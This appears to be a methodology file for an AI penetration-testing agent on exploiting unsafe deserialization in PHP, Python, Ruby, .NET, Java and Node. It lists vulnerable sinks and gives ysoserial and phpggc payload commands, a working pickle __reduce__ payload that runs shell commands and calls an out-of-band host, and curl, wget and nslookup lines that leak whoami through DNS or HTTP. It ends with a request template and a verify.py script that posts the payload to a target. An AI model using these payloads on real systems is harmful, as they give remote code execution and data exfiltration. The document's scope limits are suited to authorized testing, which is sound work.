---
name: deserialize
description: "Unsafe deserialization — language-specific gadget chains, magic methods, blind detection."
category: deserialize
allowed_tools:
  - curl
  - python
  - ffuf
version: "1.0.0"
author: "MIRV"
---

# Unsafe Deserialization Methodology

## 1. Identify deserializers in use
Tech fingerprints → suspect sink:
- PHP `unserialize()` — Yii, Laravel queue, Symfony ModelState
- Python `pickle.loads`, `yaml.load(Loader=UnsafeLoader)`, Flask/Django signed cookies (`itsdangerous`)
- Ruby `Marshal.load`, `YAML.load`; Rails cookie store historical CVE-class gadget chains
- .NET `BinaryFormatter.Deserialize`, `JavaScriptSerializer`; ViewState MAC disabled
- Java `ObjectInputStream.readObject` on RMI, JMX, JNDI endpoints
  (`InvokerTransformer` chain via CommonsCollections)
- Node `node-serialize.unserialize` (`_$$ND_FUNC$$_` token → RCE)
- PyYAML unsafe Loader accepts `!!python/object/apply:` tags

## 2. Generate payloads with toolchain
- **Java**: `java -jar ysoserial.jar CommonsCollections5 'curl http://OAST/x' | base64 -w0 > p.b64`
- **PHP**: `phpggc Laravel/RCE1 'id' | base64 -w0`; `phpggc --list` for chains
- **Python**:
```python
import pickle, os, base64
class P:
    def __reduce__(self):
        return (os.system, ('id > /tmp/x; curl http://OAST/$(id -u)',))
print(base64.b64encode(pickle.dumps(P())).decode())
```
- **Ruby Marshal**: craft `\x04\x08o:\x10Exploit...` using the
  `universal-ruby-marshal-gadget` reference repo
- **.NET**: `ysoserial.net -g TypeConfuseDelegate -f BinaryFormatter -c 'cmd' -o raw`

### Magic methods per language
- PHP: `__wakeup`, `__destruct`, `__toString`
- Java: `readObject`, `readResolve`; `HashMap` chains via `equals`/`hashCode`
- Python: `__reduce__`, `__reduce_ex__`
- Ruby: `marshal_load`, YAML tag `ruby/object:`
- .NET: `OnDeserialized` attribute, `SerializationMap`

## 3. Blind detection
- **Timing — sleep gadget**: drop `sleep 5` gadget; latency delta vs baseline ≥5s ⇒ confirmed
- **OOB — DNS exfil with Burp Collaborator**:
  - payload `curl $(whoami).$UUID.oast.fun` or `nslookup $(whoami).$UUID.oast.fun`
  - check Collaborator for DNS lookups; subdomain encodes the leaked datum
- **HTTP exfil**: `wget http://COLLAB/$(whoami)` → observe Collaborator log hit
- Avoid sleeps >10s (WAF / app timeout masking)
- Try base64 / hex transports for the same gadget when the source expects ASCII-safe input

## 4. Common sources
- Cookies / session-id (base64 binary or hex-encoded JSON)
- `Authorization: Bearer <jwt>` fields refreshed with pickle/ViewState legacy blob
- Form fields named `r`, `payload`, `cmdEncodedData`, `state`
- File uploads: `.config`, `.saz`, XML with `<jndi>` tag
- JNDI lookup via `?helpToCache?file=ldap://OAST/Exploit`
- ASP.NET `__VIEWSTATE` (legacy, MAC disabled)
- RMI registry, JMX endpoints, JBoss remoting

## 5. PoC minimal reproduction template
```http
POST /api/v1/preferences HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Cookie: prefs=<BASE64_PICKLE_PAYLOAD>

prefs=<BASE64_PICKLE_PAYLOAD>
```
```python
# verify.py
import pickle, base64, requests
r = requests.post("https://target/api/v1/preferences",
                  cookies={"prefs": base64.b64encode(pickle.dumps(P())).decode()},
                  timeout=10)
print("ok" if r.ok else "nope", r.status_code)
```

## IMPORTANT
- Every PoC: full request + Collaborator DNS hit screenshot + quoted gadget name
- Diagnostic ping first (Collaborator), RCE confirmation later; avoid destructive commands
- Never exfiltrate real user data with these payloads; stop at a Collaborator ping
- Blind chains: marshal magic bytes survive many transports but re-baseline timings per attempt
- Report: source location (`$_COOKIE['prefs']`), sink (`unserialize()`), gadget
  (CommonsCollections5), observed OOB hit with timestamp